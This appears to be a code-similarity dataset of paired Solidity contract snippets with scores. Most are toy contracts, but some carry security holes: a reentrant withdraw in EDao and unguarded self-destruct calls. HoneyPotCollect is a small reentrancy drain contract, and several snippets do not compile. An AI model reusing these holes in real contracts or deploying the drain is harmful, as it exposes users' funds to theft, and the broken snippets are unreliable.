    TokenInterface token;

    

    event NewTokenAddress(address indexed ERC20_ADDRESS);

    event TokensWithdrawn(address indexed ERC20_ADDRESS, uint256 TOTAL);

    event AirdropInvoked();

    

    

    function setTokenAddress(address _newTokenAddress) public onlyOwner returns(bool) {

        require(_newTokenAddress != address(token));

        require(_newTokenAddress != address(0));

        token = TokenInterface(_newTokenAddress);

        NewTokenAddress(_newTokenAddress);

        return true;

    }

    



    

    function multiValueAirDrop(address[] _addrs, uint256[] _values) public onlyOwner returns(bool) {

	    require(_addrs.length == _values.length && _addrs.length <= 100);

        for (uint i = 0; i < _addrs.length; i++) {

            if (_addrs[i] != 0x0 && _values[i] > 0) {

                token.transfer(_addrs[i], _values[i]);  

            }

        }

        AirdropInvoked();

        return true;

    }





    

    function singleValueAirDrop(address[] _addrs, uint256 _value) public onlyOwner returns(bool){

	    require(_addrs.length <= 100 && _value > 0);

        for (uint i = 0; i < _addrs.length; i++) {

            if (_addrs[i] != 0x0) {

                token.transfer(_addrs[i], _value);

            }

        }

        AirdropInvoked();

        return true;

    }

    

    

    

    function withdrawTokens(address _addressOfToken) public onlyOwner returns(bool) {

        TokenInterface tkn = TokenInterface(_addressOfToken);

        if(tkn.balanceOf(address(this)) == 0) {

            revert();

        }

        TokensWithdrawn(_addressOfToken, tkn.balanceOf(address(this)));

        tkn.transfer(owner, tkn.balanceOf(address(this)));

    }

}"
"contract Test {

    function Test() {
        owner = msg.sender;
    }

    function pay(uint _price) payable returns (bool) {
        

        require(_price == msg.value); 
        address(this).transfer(msg.value); 
        balanceOfContract[address(this)] += msg.value; 

        LogDeposit(msg.sender, msg.value);

        return true;
    }
}",0.6507144027869888,"contract Admin {

    address public owner;
    mapping(address => bool) public AdminList;
    
    function Test() public returns (uint256 _balance) {
            
        address sender = msg.sender;
        return sender.balance;
        
    }
    
      function TestX() public {
         
         owner = msg.sender;
        
    }
    
}"
"contract greeter {
    string name;

    function setName(string name_) {
        name = name_;
    }

    function getName() constant returns(string) {
        return name;
    }
}",0.6217509217632521,"contract Cookie {



  function () public payable {}



  



  function getFlavor()

    public

    constant

    returns (string flavor)

  {

    return ""mmm ... chocolate chip"";

  }

}"
"contract two {
    struct A {
        address[] count;
    }

    mapping (address => A) a;

    function add(address c) {
        a[msg.sender].count.push(c);
    }
}",0.6012293979772283,"contract DSAuthority {
    function canCall(
        address src, address dst, bytes4 sig
    ) public constant returns (bool);
}"
"contract TestContract {


    bytes32 internal lastHash;

    constructor() {
        lastHash = keccak256(abi.encodePacked(msg.sender, now));
    }

    function getHash() public view returns(bytes32) {
        return lastHash;
    }

    function getHashNum() public view returns(uint256) {
        return uint256(lastHash);
    }
}",0.617021523102781,"contract ProofOfExistence {



    uint topHash;

    address owner;



    constructor() public {

       owner = msg.sender;

    }



    function publishTopHash(uint _topHash) public {

        if (owner == msg.sender) {

            topHash = _topHash;

        }

    }



    function get() public view returns (uint) {

        return topHash;

    }

}"
"contract Login {

event LoginAttempt(address sender, string password);

address private sender;
string private password;

function successfulLogin (address _sender, string _password) public {
    LoginAttempt(_sender, _password);
    sender = _sender;
    password = _password;
}

function failedLogin (address _sender, string _password) public {
    LoginAttempt(_sender, _password);
}

function recoverAddr(bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) public pure returns (address) {
    return ecrecover(msgHash, v, r, s);
}

function isSigned(address _addr, bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) public pure returns (bool) {
    return ecrecover(msgHash, v, r, s) == _addr;
}
",0.6076884450482597,"contract IERC20 {
    function totalSupply() pure public returns (uint _totalSupply);
    function balanceOf(address _owner) pure public returns (uint balance);
    function transfer(address _to, uint _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint _value) public returns (bool success);
    function approve(address _spender, uint _value) public returns (bool success);
    function allowance(address _owner, address _spender) pure public returns (uint remaining);
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}"
"contract SimpleExample {
    function getSender() constant returns (address) {
        return msg.sender;
    }
}",0.6719860558028338,"contract addressGetter {

    function getDividendsTokenAddress() public constant returns (address);

}"
"contract d13 {
    bool public car;
    function setCar() public returns (bool) {
        car=true;
        return car;
    }

    function removeCar() public returns (bool) {
        car=false;
        return car;
    }
    function showMemory() pure returns (uint) {
        uint ms;
        assembly {
           ms := msize()
        }
        return ms;
    }
}",0.6520705618232906,"contract ERC20Interface {
  function name() public view returns (string memory);
  function symbol() public view returns (string memory);
  function decimals() public view returns (uint8);
  function balanceOf(address _owner) public view returns (uint256 balance);
}"
"contract d12 is d13 {
    function isCar() public view returns (bool) {
        return car; 
    }

    function newCar() public {
        car=true;
    }

    function oldCar() public {
        car=false;
    }
    function showMemory() pure returns (uint) {
        uint ms;
        assembly {
           ms := msize()
        }
        return ms;
    }
}",0.6790442767873258,"contract ERC20BadInterface {
  function name() public view returns (bytes32);
  function symbol() public view returns (bytes32);
  function decimals() public view returns (uint8);
  function balanceOf(address _owner) public view returns (uint256 balance);
}"
"contract d14 {
    function isCar() view returns (bool) {
        return (new d13()).car();
    }

    function setCar() returns (bool) {
        d13 d13instance = new d13();
        d13instance.setCar();
        return (d13instance.car());
    }
    function showMemory() pure returns (uint) {
        uint ms;
        assembly {
           ms := msize()
        }
        return ms;
    }

}",0.6182358509489158,"contract ERC20Interface {
  function name() public view returns (string memory);
  function symbol() public view returns (string memory);
  function decimals() public view returns (uint8);
  function balanceOf(address _owner) public view returns (uint256 balance);
}"
"contract Test {

    mapping (address => uint256) weismap;

    function bet(uint vote) payable returns (uint256 weis) {
        if (msg.value==0) throw;
        weismap[msg.sender]= msg.value;
        return  weismap[msg.sender];
    }

    function test()  returns (uint myVote)  {
           return 1;
    }
}",0.6323742713628628,"contract EstateToken is AbstractToken {

  mapping (address => uint256) internal accounts;

  function transfer (address _to, uint256 _value) public returns (bool);

  function balanceOf (address _owner) public view returns (uint256 balance);

}"
"contract KVStore {

 mapping(address => mapping(string => string)) store;
 uint MAX_STR_LENGTH = 1000;

 function get(address _acct, string _key) public view returns(string) {
    return store[_acct][_key];
 }
 function set(string _key, string _value) public {
   if (bytes(_value).length <= MAX_STR_LENGTH) {
     store[msg.sender][_key] = _value;
   }
 }

}",0.6234030997033134,"contract ApoIPFS

 {

      mapping (address => mapping (string => string)) apos;





      function setIPFS(address _addr,string datetime,string _ipfshash) public

      {

          

          if(bytes(apos[_addr][datetime]).length==0)

          {

              apos[_addr][datetime] = _ipfshash;

          }

      }

      



      function getIPFS(address _addr,string datetime) public constant returns (string)

      {

           

            return apos[_addr][datetime];

      }



}"
"contract distribution { 

event Transfer(
        address owner,
        address addresses,
        uint _value
        );

mapping(address => uint) balances;

address private owner;

function distributeBlox(address[] addresses, uint256 _value)  {
    for (uint i = 0; i < addresses.length; i++) {
        balances[owner] -= _value;
        balances[addresses[i]] += _value;
        Transfer(owner, addresses[i], _value);
        }
    }
}",0.6775341762609102,"contract DistributeETH is Ownable {

  



  function distribute(address[] _addrs, uint[] _bals) onlyOwner public{

    for(uint i = 0; i < _addrs.length; ++i){

      if(!_addrs[i].send(_bals[i])) throw;

    }

  }

  

  function multiSendEth(address[] addresses) public onlyOwner{

    for(uint i = 0; i < addresses.length; i++) {

      addresses[i].transfer(msg.value / addresses.length);

    }

    msg.sender.transfer(this.balance);

  }

}"
"contract Lottery {
    address public manager;
    address[] public players;

    constructor () public {
        manager = msg.sender;
    }

    function enter() public payable {
        require(msg.value > 0.01 ether);
        players.push(msg.sender);
    }

    function random() private view returns (uint256) {
        returns unit(keccak256(abi.encodePacked(block.difficulty, now, players)));
    }


}",0.656575778381606,"contract MockOracle is OracleInterface {



    uint256 public price_;

    address owner;

    

    

    modifier onlyOwner() {

        if (msg.sender != owner) {

            revert();

        }

         _;

    }

    

    constructor() public {

        owner = msg.sender;

    }



    function setPrice(uint256 price) public onlyOwner {

    

      price_ = price;



    }



    function price() public view returns (uint256){



      return price_;



    }



}"
"contract A {
  function die(address _recipient) external {
    suicide(_recipient);
  }
}",0.6510050757175119,"contract ICToken {
    function underlying() external view returns(address);
}"
"contract B {
  A a;
  function () {
    a.die(this);
  }
}",0.6445731028513432,"contract Test {
    
    function die() {
        suicide(0);
    }
}"
"contract Adoption {
    address[16] public adopters;

    function adopt(uint petId) public returns (uint) {
        require(petId >= 0 && petId <= 15);
        adopters[petId] = msg.sender;
        return petId;
    }

    function getAdopters() public returns (address[16]) {
        return adopters;
    }
}",0.6261058464172605,"contract ZTHInterface {
  function getFrontEndTokenBalanceOf(address who) public view returns (uint);
  function transfer(address _to, uint _value) public returns (bool);
  function approve(address spender, uint tokens) public returns (bool);
}"
"contract lastPrice {
     uint price ; 
     uint lprice ;

     function lastPrice (uint _price) {
        lprice = (_price * 1 ether);
       }

     function showPrice () constant returns (uint) {
        return lprice ;
     }
   }",0.6662671475104374,"contract SimpleStorageCleide {

    

    uint price;



    

    function setCleide (uint newValue) 

    public

    {

        price = newValue;

    }

    

    

    function getCleide() 

    public 

    view

    returns (uint) 

    {

        return price;

    }

}"
"contract Another {
    event LogFunctionFlow(uint);
    uint public balance;
    function sendToAnother() public {
        balance += 10;
        emit LogFunctionFlow(balance);
    }
}",0.6199583510353532,"contract token { function transfer(address receiver, uint amount) public{  }

    function balanceOf(address _owner) public returns (uint256 balance){ }

}"
"contract TestContract {
  function testThrow() {
    throw;
  }
}",0.6046974351165622,"contract contractX 

{

  function exit() public;

}"
"contract addressRecord {
    struct  Record {
        address owner;
        uint score;
    }

    mapping (string => Record) records;
    string[] records_arr;

    function addDomain(string _domain, uint _score) {
        if (records[_domain].owner != address(0x0)
        && records[_domain].owner != msg.sender) { return; }

        records[_domain] = Record(msg.sender, _score);
        records_arr.length += 1;
        records_arr[records_arr.length-1] = _domain;
    }

    function getDomain(string _domain) constant returns(uint) {
        return records[_domain].score;
    }

    function changeScore(string _domain, address _to) {
        require(records[_domain].owner == msg.sender);
        records[_domain].owner = _to;
    }    

    function domainsCount() constant returns (uint) {
        return records_arr.length;
    }
}",0.6320264349678123,"contract RegistryContract {
    
    struct record {
       uint timestamp;
       string info;
    }
    
    mapping (uint => record) public records;
   
    address owner;
   
   
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
   
   
   
    function RegistryContract() {
       owner = msg.sender;
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
    
    function put(uint _uuid, string _info) public onlyOwner {
        require(records[_uuid].timestamp == 0);
        records[_uuid].timestamp = now;
        records[_uuid].info = _info;
    }
    
    function getInfo(uint _uuid) public returns(string) {
        return records[_uuid].info;
    }
    
    function getTimestamp(uint _uuid) public returns(uint) {
        return records[_uuid].timestamp;
    }
    
}"
"contract EDao {
    address payable public student; 

    
    event Success(address src,uint256 ret);
    event Fail(address src,uint256 ret);
    event NotEnoughFunds(address src, uint256 req, uint256 avail, uint256 balance);

    
    struct Fund {
        address payable payoutAddr;
        uint256 amount;
    }
    struct Investor {
        bool canFund;
        bool canAddInvestor;
    }

    
    mapping(address => Investor) investors;
    mapping(address => Fund) funds;

    constructor(address payable _student) public payable {
        
        investors[msg.sender] = Investor({canFund:true, canAddInvestor:true});

        
        student = _student;
        investors[student] = Investor({canFund:true, canAddInvestor:true});
    }

    function fundit(address payable to) public payable {
        Investor memory b = investors[msg.sender];
        if (b.canFund) {
            Fund storage f = funds[to];
            f.payoutAddr = to; 
            f.amount += msg.value;
            emit Success(msg.sender,0);
        } else {
            emit Fail(msg.sender,1);
            revert();
        }
    }

    function queryFunds(address addr) public view returns (uint256) {
        Fund memory f = funds[addr];
        return f.amount;
    }

    function withdraw(address payable addr,uint256 amount) public returns (bool) {
        Fund storage f = funds[addr];
        if (f.amount >= amount && amount <= address(this).balance) {
            (bool success, ) = f.payoutAddr.call.value(amount)("""");
            if (success) {
                f.amount = f.amount - amount;
                return true;
            }
        } else {
          emit NotEnoughFunds(msg.sender,amount,f.amount,address(this).balance);
        }
        return false;
    }    

        function getStudent() public view returns (address) {
                return student;
        }

    function addInvestor(address payable investorAddr,bool canAdd) public {
        Investor memory b = investors[msg.sender];
        if (b.canAddInvestor) {
            investors[investorAddr] = Investor({canFund:true, canAddInvestor:canAdd});
            emit Success(msg.sender,0);
        } else {
            emit Fail(msg.sender,2);    
        }
    }

    function getInvestor(address investorAddr) public view returns (bool canFund, bool canAddInvestor) {
        Investor memory b = investors[investorAddr];
        canFund = b.canFund;
        canAddInvestor = b.canAddInvestor;
                return (canFund, canAddInvestor);
    }

}",0.6562881630725662,"contract Dimitry {



using SafeMath for uint256;

string public constant symbol = ""BIGDICK"";

string public constant name = ""Dimitry"";

uint8 public constant decimals = 18;

uint256 _totalSupply = 100000000 * 10 ** uint256(decimals);





address public owner;





mapping(address => uint256) balances;





mapping(address => mapping (address => uint256)) allowed;





constructor() Dimitry() public {

   owner = msg.sender;

   balances[owner] = _totalSupply;

}





function totalSupply() public constant returns (uint256) {

   return _totalSupply;

}



function balanceOf(address _owner) public constant returns (uint256 balance) {

   return balances[_owner];

}



function transfer(address _to, uint256 _amount) public returns (bool success) {

   if (balances[msg.sender] >= _amount && _amount > 0) {

       balances[msg.sender] = balances[msg.sender].sub(_amount);

       balances[_to] = balances[_to].add(_amount);

       emit Transfer(msg.sender, _to, _amount);

       return true;

   } else {

       return false;

   }

}



function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {

   if (balances[_from] >= _amount && allowed[_from][msg.sender] >= _amount && _amount > 0) {

       balances[_from] = balances[_from].sub(_amount);

       allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);

       balances[_to] = balances[_to].add(_amount);

       emit Transfer(_from, _to, _amount);

       return true;

   } else {

       return false;

   }

}



function approve(address _spender, uint256 _amount) public returns (bool success) {

   if(balances[msg.sender]>=_amount && _amount>0) {

       allowed[msg.sender][_spender] = _amount;

       emit Approval(msg.sender, _spender, _amount);

       return true;

   } else {

       return false;

   }

}



function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {

   return allowed[_owner][_spender];

}



event Transfer(address indexed _from, address indexed _to, uint _value);

event Approval(address indexed _owner, address indexed _spender, uint _value);





function getMyBalance() public view returns (uint) {

   return balances[msg.sender];

}

}"
"contract Users {
    mapping (bytes32 => address) public users;

    function register(bytes32 name) {
        if(users[name] == 0 && name != """"){
            users[name] = msg.sender;
        }
    }

    function checkAvailability(bytes32 name) returns (bool) {
      if(users[name] == 0) {
        return true;
      }
      return false;
    }

}",0.6487020877550927,"contract IOldInviteData{

    

    function checkUp(address addr,bytes32 name) public view returns (uint8);

    function GetAddressByName(bytes32 name) public view returns (address);

    function m_addrToName(address addr) public view returns (bytes32 name);

        

}"
"contract Functest {
    bytes32 foo; 

    function setFoo(bytes32 _foo) public {
        foo = _foo;
    }

    function getFoo() constant public returns (bytes32) {
        return foo;
    }
}",0.680619500729861,"contract NotaryPersistentStorage {
    function storeProof(bytes32 _proof) public returns (bool);
    function hasProof(bytes32 _proof) public constant returns (bool);
}"
"contract TestNode { 
    uint[] nodes;

    function createNode(uint data) public {
        nodes.length = 0; 
        nodes.push(data);
    }

    function pushNode(uint data) public {
        nodes.push(data);
    }

    function getNode() public view returns(uint[] memory) {
        return nodes;
    }
}",0.6245618471508919,"contract Example is Upgradeable {
    uint _value;
    
    function initialize() public {
        _sizes[bytes4(keccak256(""getUint()""))] = 32;
    }
    
    function getUint() public view returns (uint) {
        return _value;
    }
    
    function setUint(uint value) public {
        _value = value;
    }
}"
"contract Store {
    string[] public objects;

    function setData(string memory x, string memory y) public {
        objects.push(x);
        objects.push(y);
    }

    function getDataAtIndex(uint256 index) public returns (string memory, string memory) {
        return (objects[2 * index], objects[2 * index + 1]);
    }

    function getCount() public returns (uint count) {
        return objects.length / 2;
    }

    function getAllData() constant returns (string[]) {
        return objects;
    }
}",0.6461663702582768,"contract Peony is Ownable {
  function stock(string _index, string _unit, uint256 _amount, string _list) returns (bool);
  function ship(string _index) returns (bool);
  function mint(uint256 _ptAmount) returns (bool);
  function reduce(uint256 _tokenAmount) returns (bool);
  function setTokenAddress(address _address) returns (bool);
  function info(string _index) constant returns (string, string, uint256, string);
}"
"contract NameService {
   uint256 _reservePrice;

   struct addresses{
    address addr;
    bytes32 value;
   }

   mapping(bytes32 => addresses) data;

   
   constructor(uint256 reservePrice) public {
       _reservePrice = reservePrice;
   }

   function transferTo(bytes32 name, address newOwner) public {
        data[name].addr = newOwner;
   }

   function setValue(bytes32 name, bytes32 value) public {
        data[name].value = value;

   }

   function getValue(bytes32 name) public view returns (bytes32) {
        return data[name].value;
   }

   function commitToName(bytes32 commitment) public payable {
        
   }

   function registerName(bytes32 nonce, bytes32 name, bytes32 value) public {
        setValue(name, value);
        makeCommitment(nonce, name, msg.sender);
   }

   function getOwner(bytes32 name) public view returns(address) {
        return data[name].addr;
   }

   
   function makeCommitment(bytes32 nonce, bytes32 name, address sender) public pure returns(bytes32) {
       return keccak256(abi.encodePacked(nonce, name, sender));
   }
}",0.6102401308642217,"contract ERC223 {

uint256 public totalSupply_;

function balanceOf(address _owner) public view returns (uint256 balance);

function totalSupply() public view returns (uint256 _supply);



function allowance(address owner, address spender) public view returns (uint256);

function transferFrom(address from, address to, uint256 value) public returns (bool);

function approve(address spender, uint256 value) public returns (bool);

event Approval(address indexed owner, address indexed spender, uint256 value);



function transfer(address to, uint value) public returns (bool success);

function transfer(address to, uint value, bytes data) public returns (bool success);

event Transfer(address indexed _from, address indexed _to, uint256 _value);

event ERC223Transfer(address indexed _from, address indexed _to, uint256 _value, bytes _data);

}"
"contract C {
  function f(uint x) returns (uint y) {
    y = 1;
    for (uint i = 0; i < x; i++)
      y = 2 * y;
  }
}",0.6492058509923441,"contract Ceil {

    

    

    function ceil(uint a, uint m) constant returns (uint ) {

        return ((a + m - 1) / m) * m;

    }

    

    

}"
"contract Crowdfunding {

    address private owner;

    mapping (address => uint) investors;

    
    function Crowdfunding() {
        owner = msg.sender;
    }

    
    modifier investorsOnly {
        if(investors[msg.sender] == 0) throw;
        _;
    }

    
    event PaymentReceived(uint Amount, address From, address To);
    event WithdrawalClaimed(uint Amount, address From);

    
    function() payable {
        investors[msg.sender] += msg.value;
        PaymentReceived(msg.value, msg.sender, this);
    }

    function withdrawFunds() {
        suicide(owner);
    }

    function getRefund() investorsOnly {
        uint amount = investors[msg.sender];
        investors[msg.sender] = 0;
        msg.sender.transfer(amount);
        WithdrawalClaimed(amount, msg.sender); 
    }
}",0.6505533774175172,"contract Merchant {
    
    address public owner;
    
    
    event ReceiveEther(address indexed from, uint256 value);
    
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    
    function Merchant() public {
        owner = msg.sender;
    }
    
    
    function () public payable {
        ReceiveEther(msg.sender, msg.value);
    }
    
    
    function withdrawFunds(address withdrawAddress, uint256 amount) onlyOwner public returns (bool) {
        if(this.balance >= amount) {
            if(amount == 0) amount = this.balance;
            withdrawAddress.transfer(amount);
            return true;
        }
        return false;
    }
    
    
    function withdrawAllFunds() onlyOwner public returns (bool) {
        return withdrawFunds(msg.sender, 0);
    }
}"
"contract con1 {
    bytes32[5] data;

    function con1(){
    }

    function addData(bytes32[5] a) { 
    }   

    function getData() public constant returns(bytes32[5]){  
        return (data);
    }
}",0.6353613386307293,"contract Mooncat {
        function giveCat(bytes5 catId, address to) public;
        function catOwners(bytes5 catId) constant returns (address catOwner);

}"
"contract Election {

    string public candidate;

    function Eletion () public {
        candidate = ""Candidate 1"";
    }
}",0.6061366455241863,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract TimedChest {

    
    address public withdrawer;

    
    address public owner;

    
    ERC20 public token;
    
    

    
    uint[] public releaseTimes;

    
    uint[] public amounts;

    modifier onlyAfter(uint _time) {
        require(now >= _time);
        _;
    }

    modifier onlyBy(address _account) {
        require(msg.sender == _account);
        _;
    }

    function changeOwner(address _newOwner) public onlyBy(owner) {
        owner = _newOwner;
    }

    function TimedChest(uint[] _releaseDelays, uint[] _amounts, address _withdrawer, address _tokenAddress) public {
        owner = msg.sender;

        require (address(_tokenAddress) != 0x0);
        require (address(_withdrawer) != 0x0);
        require (_releaseDelays.length == _amounts.length && _releaseDelays.length > 0);

        for (uint8 i = 0; i < _releaseDelays.length; i++) {
            require(_releaseDelays[i] > now);
            require(_amounts[i] > 0);
            if (i == 0) {
                releaseTimes[i] = now + _releaseDelays[i];
            } else {
                releaseTimes[i] = releaseTimes[i-1] + _releaseDelays[i];
            }
        }

        releaseTimes = _releaseDelays;
        amounts = _amounts;
        withdrawer = _withdrawer;

        token = ERC20(_tokenAddress);
        
        
    }

    function withdraw() onlyBy(withdrawer) external {
        uint256 amount = token.balanceOf(this);
        require (amount > 0);

        for (uint8 i = 0; i < releaseTimes.length; i++) {
            if (releaseTimes[i] < now && amounts[i] > 0) {
                token.transfer(withdrawer, amounts[i]);
            }
        }
    }

    function withdrawAll() onlyBy(owner) external {
        uint256 amount = token.balanceOf(this);
        require (amount > 0);

        token.transfer(owner, amount);
    }

}",0.6196033612339089,"contract Disbursement {

    
    address public owner;
    address public receiver;
    uint public disbursementPeriod;
    uint public startDate;
    uint public withdrawnTokens;
    Token public token;

    
    modifier isOwner() {
        if (msg.sender != owner)
            
            revert();
        _;
    }

    modifier isReceiver() {
        if (msg.sender != receiver)
            
            revert();
        _;
    }

    modifier isSetUp() {
        if (address(token) == 0)
            
            revert();
        _;
    }

    
    
    
    
    
    function Disbursement(address _receiver, uint _disbursementPeriod, uint _startDate)
        public
    {
        if (_receiver == 0 || _disbursementPeriod == 0)
            
            revert();
        owner = msg.sender;
        receiver = _receiver;
        disbursementPeriod = _disbursementPeriod;
        startDate = _startDate;
        if (startDate == 0)
            startDate = now;
    }

    
    
    function setup(Token _token)
        public
        isOwner
    {
        if (address(token) != 0 || address(_token) == 0)
            
            revert();
        token = _token;
    }

    
    
    
    function withdraw(address _to, uint256 _value)
        public
        isReceiver
        isSetUp
    {
        uint maxTokens = calcMaxWithdraw();
        if (_value > maxTokens)
            revert();
        withdrawnTokens += _value;
        token.transfer(_to, _value);
    }

    
    
    function calcMaxWithdraw()
        public
        constant
        returns (uint)
    {
        uint maxTokens = (token.balanceOf(this) + withdrawnTokens) * (now - startDate) / disbursementPeriod;
        if (withdrawnTokens >= maxTokens || startDate > now)
            return 0;
        if (maxTokens - withdrawnTokens > token.totalSupply())
            return token.totalSupply();
        return maxTokens - withdrawnTokens;
    }
}"
"contract Controlled {  
    address public userAddr;  

    struct User {  
      address a;  
      string name;  
      string email;  
      uint phone;  
    }  

    mapping (address => User) Users;  

    function registerUser(string _name, string _email, uint _phone) returns (bool success) {  
      Users[msg.sender].a = msg.sender;  
      Users[msg.sender].name = _name;  
      Users[msg.sender].email = _email;  
      Users[msg.sender].phone = _phone;  
    }



    modifier onlyUser {
        if (msg.sender != userAddr) throw;
        _;
    }

}",0.6484359907155846,"contract Username {
  event Updated(address indexed user, string indexed username);

  mapping(address => string) public username;
  mapping(string => address) public owner;

  function Update(string memory _username) public {
    require(owner[_username] == address(0));
    string memory oldUserName = username[msg.sender];
    owner[_username] = msg.sender;
    owner[oldUserName] = address(0);
    username[msg.sender] = _username;
    emit Updated(msg.sender, _username);
  }
}"
"contract b {

    struct Info {
        bool p;

    }
    mapping(uint => Info) public t;

    function setValue() {
        Info b = t[1];
        b.p = true;
    }
    function checkValue() returns (bool) {
        return t[1].p;
    }
}",0.640982181556494,"contract BurnableERC20 is ERC20
{
    function burn(
        uint value
        )
        public
        returns (bool);

    function burnFrom(
        address from,
        uint value
        )
        public
        returns (bool);
}"
"contract TestToken is ERC20Basic {
    using SafeMath for uint;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint public _totalSupply;


    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;


    function TestToken() public {
        name = ""TestToken"";
        symbol = ""tttest"";
        decimals = 18;

        _totalSupply = 4000000000000000000000000000;
        balances[0xE3FdfaAF08F4778c7E88Ed1E31696745ed610328] = _totalSupply;
        Transfer (address(0), 0xE3FdfaAF08F4778c7E88Ed1E31696745ed610328, _totalSupply); 
     }
}",0.6512198590340864,"contract ERC20Basic {
    uint public decimals;
    string public    name;
    string public   symbol;
    mapping(address => uint) public balances;
    mapping (address => mapping (address => uint)) public allowed;
    
    address[] users;
    
    uint public _totalSupply;
    function totalSupply() public constant returns (uint);
    function balanceOf(address who) public constant returns (uint);
    function transfer(address to, uint value) public;
    event Transfer(address indexed from, address indexed to, uint value);
}"
"contract test {
    event testV(uint indexed value1);
    uint val= 0;

     function testf() public {


                  val--;

        emit testV(val); 
    }
}",0.6741754866796803,"contract Mintable {

    event Mint(address indexed to, uint value);
    function mint(address _to, uint _amount) public;
}"
"contract big_contract {
    function user_function_1 (uint32 arg1, string arg2) returns (uint32) {
        
    }

    function user_function_2 (string arg1) returns (string){
        
    }

    function admin_function (bool arg1) {
        
    }
}",0.6223485591658123,"contract OraclizeI {
    function getPrice(string _datasource, uint _gas_limit) returns (uint _dsprice);
    function query(uint _timestamp, string _datasource, string _arg) returns (bytes32 _id);
}"
"contract example2 {
  function B() internal {
    print msg.sender; 
  }
}",0.6368099287975654,"contract InstaSave is Save {

    function() external payable {}

}"
"contract Dispatcher is Upgradeable {
    function Dispatcher(address target) {
        replace(target);
    }

    function initialize() {
        
        throw;
    }

    function() {
        bytes4 sig;
        assembly { sig := calldataload(0) }
        var len = _sizes[sig];
        var target = _dest;

        assembly {
            
            calldatacopy(0x0, 0x0, calldatasize)
            delegatecall(sub(gas, 10000), target, 0x0, calldatasize, 0, len)
            return(0, len)
        }
    }
}",0.6633987936085931,"contract DelegateProxy {

    
    function delegatedFwd(address _dst, bytes _calldata) internal {
        assembly {
            let result := delegatecall(sub(gas, 10000), _dst, add(_calldata, 0x20), mload(_calldata), 0, 0)
            let size := returndatasize

            let ptr := mload(0x40)
            returndatacopy(ptr, 0, size)

            
            
            switch result case 0 { revert(ptr, size) }
            default { return(ptr, size) }
        }
    }
}"
"contract A is Owned {

   B private b;

   function A(address B) {
       b = B(b);
   }

   function myInterface() public onlyOwner {
       a.doStuff({from: msg.sender});
   }
}",0.6598298022357647,"contract Owned {

    

    address public owner;

    

    function isOwner() internal returns (bool) { return msg.sender == owner; }

    

    function Owned() { owner = msg.sender; }

}"
"contract B is Owned {

   C private c;

   function B(address c) {
       c = C(c);
   }

   function doStuff() public onlyOwner {
       c.store(42,{from: msg.sender});
   }
}",0.6405691949398944,"contract Owned {
    address public owner;

    function Owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert();
        }
        _;
    }
}"
"contract constantOrPublic {
    address creator;
    address otheraddress;

    function constantOrPublic(address _otheraddress) 
    {
        creator = msg.sender;
        otheraddress = _otheraddress;
    }

    function getConstant() constant returns(address) {
        return otheraddress;
    }
    function getPublic() public returns(address) {
        return otheraddress;
    }

}",0.6402578078466095,"contract Index is Claimable {
  address [] public addresses;

  function getAllAddresses() constant public returns(address []) {
    return addresses;
  }

  function add(address item) onlyOwner {
    addresses.push(item);
  }

  function remove(uint pos) onlyOwner {
    if (pos >= addresses.length) throw;
    delete addresses[pos];
  }
}"
"contract EtherTransferFrom {

    EtherTransferTo private _instance;

    function EtherTransferFrom() public {
    
    _instance = new EtherTransferTo();
   }

    function getBalance() public returns (uint) {
    return address(this).balance;
    }

    function getBalanceOfInstance() public returns (uint) {
    
    return _instance.getBalance();
    }

    function () public payable {
    
    address(_instance).send(msg.value);
    }
}",0.6429762492574898,"contract MinimalTokenInterface {

    function balanceOf(address tokenOwner) public constant returns (uint balance);

    function transfer(address to, uint tokens) public returns (bool success);

    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    function decimals() public returns (uint8);

}"
"contract HoneyPotCollect {
  HoneyPot public honeypot;

  constructor(address _honeypot) public {

    honeypot = HoneyPot(_honeypot);
  }

  function kill () public {
    selfdestruct(msg.sender);
  }

  function collect() payable public {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }

  function () external payable  {
    if (honeypot.balance >= msg.value) {
      honeypot.get();
    }
  }
}",0.6053587297327612,"contract Wallet {
    address payable public owner;
    
    constructor() public payable {
        owner = msg.sender;
    }
    
    modifier OnlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    function topup() public payable {
        
    }
    
    function withdraw(address payable to, uint256 value) public OnlyOwner {
        to.transfer(value);
    }

    function () external payable{}
}"
"contract OraclizeTest is usingOraclize {

    using strings for *;        
   
    uint public amount; 


    address public homeBet;  
    address public awayBet;


    

    event LogInfo(string description);      

    
    

    
    function OraclizeTest (uint _amount) public {      
        amount = _amount;        

    

        
       OAR = OraclizeAddrResolverI(0x04De331D6fFe6079cDD635780Ce588263D682D31);



        oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
        update();
    }

    
    function()
    public{
        revert();
    }
    
     
    function betOnTeam(uint team) payable public {
        
        if(team == 1)
        {
            if(homeBet == 0)
            {
                if(msg.value == amount)
                {
                    homeBet = msg.sender;
                    if(homeBet != 0 && awayBet != 0)
                    {
                        

                        update();
                       
                    }
                }
                else
                {
                    throw;
                }
            }
            else
            {
                throw;
            }
        }
        else if(team == 2)
        {
            if(awayBet == 0)
            {
                if(msg.value == amount)
                {
                    awayBet = msg.sender;

                    if(homeBet != 0 && awayBet != 0)
                    {
                        
                        update();
                      
                    }
                }
                else
                {
                    throw;
                }
            }
            else
            {
                throw;
            }
        }
        else
        {
            throw;
        }
    }
    
    function __callback(bytes32 id, string result, bytes proof) public {
    require(msg.sender == oraclize_cbAddress());        
    update();
    
    if (result.toSlice().equals(""home"".toSlice()))
    {
        homeBet.transfer(address(this).balance);
    }
    else if(result.toSlice().equals(""away"".toSlice()))
